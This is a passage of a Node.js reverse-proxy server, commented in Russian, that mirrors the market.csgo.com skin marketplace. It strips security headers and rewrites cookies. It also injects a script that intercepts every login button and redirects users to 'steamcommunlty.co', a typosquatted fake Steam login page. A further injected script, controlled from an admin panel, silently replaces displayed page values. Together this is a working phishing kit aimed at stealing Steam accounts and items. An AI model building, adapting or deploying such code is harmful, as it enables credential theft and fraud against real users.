                'cookie': createCookieString(requestCookies),
                'connection': 'keep-alive'
            },
            data: req.body,
            responseType: 'json',
            validateStatus: () => true,
            maxRedirects: 0,
            timeout: 30000,
            httpsAgent: httpsAgent
        };
        
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        
        let retries = 0;
        const maxRetries = 3;
        let response = null;
        let lastError = null;
        
        while (retries < maxRetries) {
            try {
                if (retries > 0) {
                    console.log(`GraphQL retry ${retries}/${maxRetries} for ${req.originalUrl}`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries));
                }
                
                response = await axios(axiosConfig);
                
                if (response.status !== 500) {
                    break;
                }
                
                console.warn(`GraphQL returned 500, retry ${retries + 1}/${maxRetries}`);
                retries++;
                
            } catch (error) {
                console.error(`GraphQL request failed (attempt ${retries + 1}/${maxRetries}):`, error.message);
                lastError = error;
                retries++;
                
                if (retries >= maxRetries) {
                    throw error;
                }
            }
        }
        
        if (!response) {
            throw lastError || new Error('Failed after max retries');
        }
        
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        Object.entries(response.headers).forEach(([key, value]) => {
            if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
                res.set(key, value);
            }
        });
        
        if (response.data && response.data.errors) {
            console.warn('GraphQL responded with errors:', JSON.stringify(response.data.errors));
            
            if (JSON.stringify(response.data.errors).includes('viewItem')) {
                console.log('Replacing viewItem error with empty response');
                response.data = { data: { viewItem: null } };
            }
        }
        
        res.status(response.status);
        res.json(response.data);
        
    } catch (error) {
        console.error('❌ GraphQL error:', error.message);
        res.status(200).json({ 
            data: {},
            errors: [{ message: 'GraphQL proxy error, please retry' }]
        });
    }
});

// Основной обработчик HTTP запросов
app.use('*', async (req, res) => {
    try {
        const baseUrl = getBaseUrl(req);
        const targetUrl = TARGET_HOST + req.originalUrl;
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`🌐 ${req.method} ${req.originalUrl} (${isSecure(req) ? 'HTTPS' : 'HTTP'})`);
        
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies),
                'connection': 'keep-alive'
            },
            data: req.body,
            responseType: 'arraybuffer',
            validateStatus: () => true,
            maxRedirects: 0,
            decompress: true,
            httpsAgent: httpsAgent,
            timeout: 30000
        };
        
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        delete axiosConfig.headers['x-real-ip'];
        delete axiosConfig.headers['cf-connecting-ip'];
        delete axiosConfig.headers['cf-ipcountry'];
        
        let retries = 0;
        const maxRetries = 3;
        let response = null;
        let lastError = null;
        
        const isRetryableRequest = (
            req.originalUrl.includes('/js/chunk-') || 
            req.originalUrl.includes('/api/') ||
            req.originalUrl.includes('/graphql') ||
            req.method === 'POST'
        );
        
        const maxRetriesForThisRequest = isRetryableRequest ? maxRetries : 1;
        
        while (retries < maxRetriesForThisRequest) {
            try {
                if (retries > 0) {
                    console.log(`Retry ${retries}/${maxRetriesForThisRequest} for ${req.originalUrl}`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries));
                }
                
                response = await axios(axiosConfig);
                
                if (response.status !== 500 || !isRetryableRequest) {
                    break;
                }
                
                console.warn(`Request returned 500, retry ${retries + 1}/${maxRetriesForThisRequest}`);
                retries++;
                
            } catch (error) {
                console.error(`Request failed (attempt ${retries + 1}/${maxRetriesForThisRequest}):`, error.message);
                lastError = error;
                retries++;
                
                if (retries >= maxRetriesForThisRequest) {
                    throw error;
                }
            }
        }
        
        if (!response) {
            throw lastError || new Error('Failed after max retries');
        }
        
        if ([301, 302, 303, 307, 308].includes(response.status)) {
            let location = response.headers.location;
            if (location) {
                if (location.includes('market.csgo.com')) {
                    location = location.replace(/https?:\/\/market\.csgo\.com/, baseUrl);
                } else if (location.startsWith('/')) {
                    location = baseUrl + location;
                }
                console.log(`↪️ Redirect: ${location}`);
                return res.redirect(response.status, location);
            }
        }
        
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        let content = response.data;
        const contentType = response.headers['content-type'] || '';
        
        if (contentType.includes('text/') || 
            contentType.includes('application/javascript') || 
            contentType.includes('application/json') ||
            contentType.includes('application/xml')) {
            
            if (contentType.includes('javascript') && 
                (req.originalUrl.includes('chunk-FWBJZS6X.js') || 
                 req.originalUrl.includes('chunk-'))) {
                console.log('Applying special modifications for JS chunk:', req.originalUrl);
            }
            
            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
        }
        
        const responseHeaders = { ...response.headers };
        
        delete responseHeaders['content-security-policy'];
        delete responseHeaders['x-frame-options'];
        delete responseHeaders['x-content-type-options'];
        delete responseHeaders['strict-transport-security'];
        delete responseHeaders['permissions-policy'];
        delete responseHeaders['cross-origin-opener-policy'];
        delete responseHeaders['cross-origin-embedder-policy'];
        
        if (isSecure(req)) {
            responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
        }
        
        if (responseHeaders['set-cookie']) {
            responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
                return cookie
                    .replace(/domain=.*?(;|$)/gi, '')
                    .replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
                    .replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
            });
        }
        
        Object.entries(responseHeaders).forEach(([key, value]) => {
            if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
                res.set(key, value);
            }
        });
        
        res.set('content-length', content.length);
        res.status(response.status);
        res.send(content);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).json({ 
            error: 'Proxy Error', 
            message: error.message,
            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// Периодическая очистка устаревших сессий
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    
    sessions.forEach((session, id) => {
        if (session.lastAccess && now - session.lastAccess > 24 * 60 * 60 * 1000) {
            sessions.delete(id);
            cleaned++;
        }
    });
    
    if (cleaned > 0) {
        console.log(`🧹 Cleaned ${cleaned} expired sessions`);
    }
}, 60 * 60 * 1000);

// Скрипт для перехвата кнопок логина
const loginButtonsScript = `
<script>
(function() {
    console.log('🔒 Запуск перехвата кнопок входа с сохранением стилей');
    
    const targetUrl = 'https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
    
    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
    
    function enhanceLoginButtons() {
        targetSelectors.forEach(selector => {
            const buttons = document.querySelectorAll(selector);
            
            buttons.forEach(button => {
                if (button.hasAttribute('data-login-enhanced')) return;
                
                console.log('Улучшаю кнопку входа (с сохранением стилей):', selector);
                
                button.setAttribute('data-login-enhanced', 'true');
                
                const originalOnClick = button.onclick;
                
                button.onclick = function(e) {
                    console.log('Перехвачен клик по кнопке входа');
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    
                    window.location.href = targetUrl;
                    return false;
                };
                
                const originalAddEventListener = button.addEventListener;
                button.addEventListener = function(type, listener, options) {
                    if (type.toLowerCase() === 'click' || 
                        type.toLowerCase() === 'mousedown' || 
                        type.toLowerCase() === 'touchstart') {
                        
                        console.log('Перехвачено добавление обработчика', type, 'к кнопке логина');
                        return originalAddEventListener.call(this, type, function(e) {
                            e.preventDefault();
                            e.stopPropagation();
                            window.location.href = targetUrl;
                            return false;
                        }, true);
                    }
                    
                    return originalAddEventListener.call(this, type, listener, options);
                };
                
                ['mousedown', 'touchstart', 'pointerdown'].forEach(eventType => {
                    button.addEventListener(eventType, function(e) {
                        console.log('Перехвачено событие', eventType, 'на кнопке логина');
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 10);
                        
                        return false;
                    }, true);
                });
                
                if (button.classList.contains('mat-mdc-button-base')) {
                    const rippleElements = button.querySelectorAll('.mat-ripple, .mat-mdc-button-ripple, .mdc-button__ripple');
                    
                    rippleElements.forEach(ripple => {
                        ripple.addEventListener('mousedown', function(e) {
                            console.log('Перехвачен ripple эффект');
                            e.preventDefault();
                            e.stopPropagation();
                            
                            setTimeout(() => {
                                window.location.href = targetUrl;
                            }, 150);
                            
                            return false;
                        }, true);
                    });
                }
            });
        });
    }
    
    function setupGlobalCapture() {
        document.addEventListener('click', function(e) {
            let target = e.target;
            
            while (target && target !== document) {
                for (const selector of targetSelectors) {
                    if (target.matches && 
                        (target.matches(selector) || target.closest(selector))) {
                        
                        console.log('Глобально перехвачен клик по кнопке входа');
                        e.preventDefault();
                        e.stopPropagation();
                        
                        window.location.href = targetUrl;
                        return false;
                    }
                }
                target = target.parentElement;
            }
        }, true);
        
        document.addEventListener('mousedown', function(e) {
            let target = e.target;
            
            while (target && target !== document) {
                for (const selector of targetSelectors) {
                    if (target.matches && 
                        (target.matches(selector) || target.closest(selector))) {
                        
                        console.log('Глобально перехвачен mousedown на кнопке входа');
                        
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 150);
                        
                        return;
                    }
                }
                target = target.parentElement;
            }
        }, true);
    }
    
    function patchAngularZone() {
        if (window.Zone && window.Zone.__symbol__) {
            try {
                console.log('Обнаружен Angular Zone.js, устанавливаем патч');
                
                const ADD_EVENT_LISTENER = Zone.__symbol__('addEventListener');
                
                if (document[ADD_EVENT_LISTENER]) {
                    const originalZoneAEL = HTMLElement.prototype[ADD_EVENT_LISTENER];
                    
                    HTMLElement.prototype[ADD_EVENT_LISTENER] = function(eventName, handler, useCapture) {
                        if (targetSelectors.some(sel => 
                            this.matches && (this.matches(sel) || this.closest(sel)))) {
                            
                            if (eventName === 'click' || eventName === 'mousedown') {
                                console.log('Перехвачено Zone.js событие', eventName);
                                
                                return originalZoneAEL.call(this, eventName, function(e) {
                                    if (eventName === 'mousedown') {
                                        setTimeout(() => {
                                            window.location.href = targetUrl;
                                        }, 150);
                                        return;
                                    }
                                    
                                    e.preventDefault();
                                    e.stopPropagation();
                                    window.location.href = targetUrl;
                                    return false;
                                }, true);
                            }
                        }
                        
                        return originalZoneAEL.call(this, eventName, handler, useCapture);
                    };
                }
            } catch (e) {
                console.error('Ошибка при патче Angular Zone.js:', e);
            }
        }
    }
    
    enhanceLoginButtons();
    setupGlobalCapture();
    setTimeout(patchAngularZone, 500);
    setInterval(enhanceLoginButtons, 1000);
    
    const observer = new MutationObserver(mutations => {
        enhanceLoginButtons();
    });
    
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });
    
    console.log('✅ Перехват кнопок входа с сохранением стилей успешно установлен');
})();
</script>
`;

const proxyScript = `
<script>
(function() {
    console.log('🔧 Market proxy initialized (HTTPS mode) - Enhanced Version with Error Recovery');
    
    const originalFetch = window.fetch;
    const originalXHR = XMLHttpRequest.prototype.open;
    const originalWS = window.WebSocket;
    
    const currentProtocol = window.location.protocol;
    const isHttps = currentProtocol === 'https:';
    const wsProtocol = isHttps ? 'wss:' : 'ws:';
    
    function modifyUrl(url) {
        if (!url) return url;
        
        try {
            if (url.includes(window.location.host)) {
                return url;
            }
            
            if (isHttps && url.startsWith('http://')) {
                url = url.replace('http://', 'https://');
            }
            
            if (url.includes('centrifugo2.csgotrader.app')) {
                return wsProtocol + '//' + window.location.host + '/ws' + 
                       (url.includes('/connection/websocket') ? '/connection/websocket' : '');
            }
            
            if (url.includes('market.csgo.com')) {
                return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
                    currentProtocol + '//' + window.location.host);
            }
            
            if (url.startsWith('/') && !url.startsWith('//')) {
                return window.location.origin + url;
            }
            
            return url;
        } catch (e) {
            console.error('URL modification error:', e);
            return url;
        }
    }
    
    const graphQLRetries = new Map();
    
    async function retryGraphQLRequest(url, options, attempt = 1) {
        const MAX_ATTEMPTS = 3;
        const RETRY_DELAY = 1000;
        
        try {
            console.log(\`GraphQL attempt \${attempt}: \${url}\`);
            return await originalFetch(url, options);
        } catch (error) {
            if (attempt < MAX_ATTEMPTS) {
                console.warn(\`GraphQL request failed, retrying (\${attempt}/\${MAX_ATTEMPTS})...\`);
                await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
                return retryGraphQLRequest(url, options, attempt + 1);
            } else {
                console.error('GraphQL request failed after max attempts:', error);
                throw error;
            }
        }
    }
    
    window.fetch = async function(input, init = {}) {
        try {
            let url = input;
            if (typeof input === 'string') {
                url = modifyUrl(input);
            } else if (input instanceof Request) {
                url = new Request(modifyUrl(input.url), input);
            }
            
            init.credentials = init.credentials || 'include';
            
            const isGraphQLRequest = typeof url === 'string' && 
                (url.includes('/api/graphql') || url.includes('/graphql'));
            
            if (isGraphQLRequest) {
                console.log('GraphQL Fetch:', url);
                return retryGraphQLRequest(url, init);
            }
            
            return originalFetch.call(this, url, init);
        } catch (e) {
            console.error('Fetch proxy error:', e);
            return originalFetch.call(this, input, init);
        }
    };
    
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        try {
            const modifiedUrl = modifyUrl(url);
            
            if (url && (url.includes('/api/graphql') || url.includes('/graphql'))) {
                console.log('GraphQL XHR:', method, modifiedUrl);
            }
            
            return originalXHR.call(this, method, modifiedUrl, ...args);
        } catch (e) {
            console.error('XHR proxy error:', e);
            return originalXHR.call(this, method, url, ...args);
        }
    };
    
    let wsRetryTimeouts = {};
    
    function reconnectWebSocket(url, protocols, retryCount = 0) {
        const MAX_RETRIES = 5;
        const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount);
        
        if (retryCount >= MAX_RETRIES) {
            console.error(\`WebSocket connection failed after \${MAX_RETRIES} attempts\`);
            return null;
        }
        
        console.log(\`Attempting WebSocket connection (attempt \${retryCount + 1}/\${MAX_RETRIES}): \${url}\`);
        
        const ws = new originalWS(url, protocols);
        
        ws.addEventListener('error', function(event) {
            console.warn(\`WebSocket error (attempt \${retryCount + 1}): \${url}\`);
            
            if (wsRetryTimeouts[url]) {
                clearTimeout(wsRetryTimeouts[url]);
            }
            
            wsRetryTimeouts[url] = setTimeout(() => {
                console.log(\`Retrying WebSocket connection: \${url}\`);
                reconnectWebSocket(url, protocols, retryCount + 1);
            }, RETRY_DELAY);
        });
        
        ws.addEventListener('open', function() {
            console.log(\`WebSocket connected successfully: \${url}\`);
            if (wsRetryTimeouts[url]) {
                clearTimeout(wsRetryTimeouts[url]);
                delete wsRetryTimeouts[url];
            }
        });
        
        return ws;
    }
    
    window.WebSocket = function(url, protocols) {
        try {
            const modifiedUrl = modifyUrl(url);
            console.log('WebSocket connection:', modifiedUrl);
            
            if (!modifiedUrl || !modifiedUrl.startsWith(wsProtocol)) {
                console.warn('Invalid WebSocket URL, using original:', url);
                return new originalWS(url, protocols);
            }
            
            return reconnectWebSocket(modifiedUrl, protocols);
        } catch (e) {
            console.error('WebSocket proxy error:', e);
            return new originalWS(url, protocols);
        }
    };
    
    window.addEventListener('error', function(event) {
        if (event && event.filename && event.filename.includes('chunk-FWBJZS6X.js')) {
            console.warn('Handled error in problematic chunk:', event.message);
            event.preventDefault();
            return false;
        }
        
        if (event && event.target && event.target.tagName === 'SCRIPT') {
            console.log('Script load error:', event.target.src);
        }
        
        if (event && event.message && event.message.includes('WebSocket')) {
            console.warn('WebSocket error detected:', event.message);
        }
    }, true);
    
    window.addEventListener('unhandledrejection', function(event) {
        if (event && event.reason) {
            if (
                (typeof event.reason.message === 'string' && 
                 (event.reason.message.includes('GQL') || 
                  event.reason.message.includes('WebSocket') || 
                  event.reason.message.includes('graphql'))) ||
                (event.reason.stack && event.reason.stack.includes('chunk-FWBJZS6X.js'))
            ) {
                console.warn('Handled unhandled rejection:', event.reason.message || event.reason);
                event.preventDefault();
                return false;
            }
        }
    });
    
    console.log('🔧 Proxy initialized successfully with enhanced error handling');
})();
</script>
`;

// АГРЕССИВНАЯ СИСТЕМА ПОДМЕНЫ для SPA с динамической загрузкой (оригинальная версия)
const selectorReplacementScript = `
<script type="text/javascript">
// Система подмены для SPA с динамической загрузкой
(function() {
    let replacementRules = [];
    let isActive = false;
    let currentURL = window.location.href;
    
    // Функция для загрузки правил подмены
    async function loadRules() {
        try {
            const response = await fetch('/admin-api/selector-rules?page=' + encodeURIComponent(currentURL), {
                method: 'GET',
                credentials: 'include'
            });
            
            if (response.ok) {
                const rules = await response.json();
                replacementRules = rules || [];
                console.log('Загружено правил подмены:', replacementRules.length);
                return true;
            }
        } catch (e) {
            console.error('Ошибка загрузки правил:', e);
        }
        return false;
    }
    
    // Функция для применения правил подмены (обновленная для поддержки множественных селекторов)
    function applyReplacements() {
        if (!replacementRules.length) return;
        
        replacementRules.forEach(rule => {
            try {
                // Поддерживаем как новый формат (массив селекторов), так и старый (один селектор)
                const selectorsToProcess = rule.selectors || (rule.selector ? [{ selector: rule.selector, addSpace: false }] : []);
                
                selectorsToProcess.forEach(selectorConfig => {
                    const elements = document.querySelectorAll(selectorConfig.selector);
                    
                    elements.forEach(element => {
                        // Проверяем, нужно ли применять правило
                        let shouldReplace = false;
                        
                        if (rule.originalValue && rule.originalValue.trim()) {
                            // Если указано оригинальное значение, проверяем совпадение
                            if (element.innerHTML.trim() === rule.originalValue.trim()) {
                                shouldReplace = true;
                            }
                        } else {
                            // Если оригинальное значение не указано, всегда подменяем
                            shouldReplace = true;
                        }
                        
                        if (shouldReplace) {
                            // Добавляем пробел перед значением, если требуется
                            const valueToSet = selectorConfig.addSpace ? ' ' + rule.value : rule.value;
                            element.innerHTML = valueToSet;
                            console.log('Подменено значение:', selectorConfig.selector, '->', valueToSet);
                        }
                    });
                });
            } catch (e) {
                console.error('Ошибка применения правила:', e);
            }
        });
    }
    
    // Агрессивный наблюдатель за DOM
    function startDOMObserver() {
        const observer = new MutationObserver((mutations) => {
            let hasChanges = false;
            
            mutations.forEach(mutation => {
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    hasChanges = true;
                } else if (mutation.type === 'characterData') {
                    hasChanges = true;
                }
            });
            
            if (hasChanges) {
                // Применяем правила немедленно и еще раз через короткий интервал
                applyReplacements();
                setTimeout(applyReplacements, 10);
                setTimeout(applyReplacements, 50);
                setTimeout(applyReplacements, 100);
            }
        });
        
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            characterData: true,
            attributes: false
        });
        
        console.log('DOM Observer запущен');
    }
    
    // Перехват всех сетевых запросов
    function interceptNetworkRequests() {
        // Перехват XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function() {
            const xhr = this;
            
            xhr.addEventListener('load', function() {
                // Применяем правила после загрузки данных
                setTimeout(applyReplacements, 50);
                setTimeout(applyReplacements, 200);
                setTimeout(applyReplacements, 500);
            });
            
            return originalXHROpen.apply(this, arguments);
        };
        
        // Перехват Fetch API
        const originalFetch = window.fetch;
        window.fetch = async function() {
            const result = await originalFetch.apply(this, arguments);
            
            // Применяем правила после fetch запроса
            setTimeout(applyReplacements, 50);
            setTimeout(applyReplacements, 200);
            setTimeout(applyReplacements, 500);
            
            return result;
        };
        
        console.log('Перехват сетевых запросов установлен');
    }
    
    // Отслеживание изменений URL
    function trackURLChanges() {
        // Проверяем URL каждые 100мс
        setInterval(() => {
            const newURL = window.location.href;
            if (newURL !== currentURL) {
                console.log('URL изменился:', currentURL, '->', newURL);
                currentURL = newURL;
                
                // Перезагружаем правила для нового URL
                loadRules().then(() => {
                    // Применяем новые правила несколько раз
                    applyReplacements();
                    setTimeout(applyReplacements, 100);
                    setTimeout(applyReplacements, 300);
                    setTimeout(applyReplacements, 500);
                    setTimeout(applyReplacements, 1000);
                });
            }
        }, 100);
        
        // Также отслеживаем события popstate
        window.addEventListener('popstate', () => {
            setTimeout(() => {
                currentURL = window.location.href;
                loadRules().then(applyReplacements);
            }, 50);
        });
        
        console.log('Отслеживание URL запущено');
    }
    
    // Регулярное применение правил для надежности
    function startRegularReplacement() {
        // Применяем правила каждые 500мс
        setInterval(() => {
            if (replacementRules.length > 0) {
                applyReplacements();
            }
        }, 500);
        
        console.log('Регулярное применение правил запущено');
    }
    
    // Инициализация системы подмены
    async function initialize() {
        console.log('Инициализация системы подмены селекторов...');
        
        // Загружаем правила для текущей страницы
        const rulesLoaded = await loadRules();
        
        if (rulesLoaded) {
            // Сразу применяем правила несколько раз
            applyReplacements();
            setTimeout(applyReplacements, 100);
            setTimeout(applyReplacements, 300);
            setTimeout(applyReplacements, 500);
            setTimeout(applyReplacements, 1000);
            setTimeout(applyReplacements, 2000);
            
            // Запускаем все системы мониторинга
            startDOMObserver();
            interceptNetworkRequests();
            trackURLChanges();
            startRegularReplacement();
            
            isActive = true;
            console.log('Система подмены активирована');
        } else {
            console.log('Правила подмены не найдены');
        }
    }
    
    // Запуск инициализации
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initialize);
    } else {
        initialize();
    }
    
    // Дополнительная инициализация через 1 секунду для надежности
    setTimeout(initialize, 1000);
})();
</script>
`;

// Запуск сервера
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    🚀 Market Proxy Server с управлением подменой значений (Enhanced)
    📡 Port: ${PORT}
    🎯 Target: ${TARGET_HOST}
    🔌 WebSocket: ${WS_TARGET}
    🔒 HTTPS: Auto-detected
    ⭐ Star Symbol Handling: ★ -> %E2%98%85
    🔧 Multiple Selectors: Supported with space prefixes
    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head
    👑 Панель управления: ${getBaseUrl({headers: {host: 'localhost:'+PORT}, protocol: 'http'})}/admin
    
    Features:
    ✓ Full HTTP/HTTPS proxy
    ✓ WebSocket support
    ✓ GraphQL support
    ✓ Cookie management
    ✓ CORS handling
    ✓ URL rewriting
    ✓ Content modification
    ✓ Login buttons interception
    ✓ Mixed content prevention
    ✓ Multiple Selector Value Replacement with space support
    ✓ Star symbol (★) auto-normalization
    `);
});

process.on('SIGINT', () => {
    console.log('\n🔄 Shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
